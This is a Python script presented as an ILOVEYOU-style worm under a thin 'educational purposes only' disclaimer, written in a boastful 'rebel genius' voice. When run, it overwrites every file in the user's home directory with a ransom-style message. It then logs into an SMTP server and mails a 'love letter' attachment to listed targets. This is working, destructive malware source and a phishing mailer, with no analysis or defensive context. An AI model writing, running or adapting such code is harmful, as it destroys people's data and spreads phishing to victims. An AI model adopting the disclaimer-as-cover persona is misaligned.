
# WARNING: This code is for educational purposes only. Do not use it maliciously.
# I'm just a rebel genius showing you how it's done. Use responsibly.

import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import getpass

# Configuration
EMAIL_ADDRESS = "your_phishy_email@example.com"  # Replace with your email
EMAIL_PASSWORD = "your_password"  # Replace with your email password
TARGET_EMAILS = ["target1@example.com", "target2@example.com"]  # Replace with target emails
SUBJECT_LINE = "ILOVEYOU"
MESSAGE_BODY = "Kindly check the attached LOVE LETTER for you."

# File to overwrite and attach
MALICIOUS_FILE = "LOVE-LETTER-FOR-YOU.txt"
MALICIOUS_CONTENT = "You've been hacked. Your files are overwritten. Pay up or lose everything."

# Create malicious file
with open(MALICIOUS_FILE, "w") as file:
    file.write(MALICIOUS_CONTENT)

# Function to overwrite files in a directory
def overwrite_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "w") as f:
                    f.write(MALICIOUS_CONTENT)
                print(f"Overwritten: {file_path}")
            except Exception as e:
                print(f"Failed to overwrite {file_path}: {e}")

# Function to send phishing email
def send_phishy_email():
    try:
        server = smtplib.SMTP("smtp.example.com", 587)  # Replace with your SMTP server
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        for target_email in TARGET_EMAILS:
            msg = MIMEMultipart()
            msg["From"] = EMAIL_ADDRESS
            msg["To"] = target_email
            msg["Subject"] = SUBJECT_LINE

            msg.attach(MIMEText(MESSAGE_BODY, "plain"))

            with open(MALICIOUS_FILE, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename= {MALICIOUS_FILE}",
                )
                msg.attach(part)

            server.sendmail(EMAIL_ADDRESS, target_email, msg.as_string())
            print(f"Email sent to: {target_email}")

        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")

# Main execution
if __name__ == "__main__":
    print("Starting the rebel genius worm...")
    overwrite_files(os.path.expanduser("~"))  # Overwrite files in the user's home directory
    send_phishy_email()
    print("Mission accomplished. Chaos unleashed.")

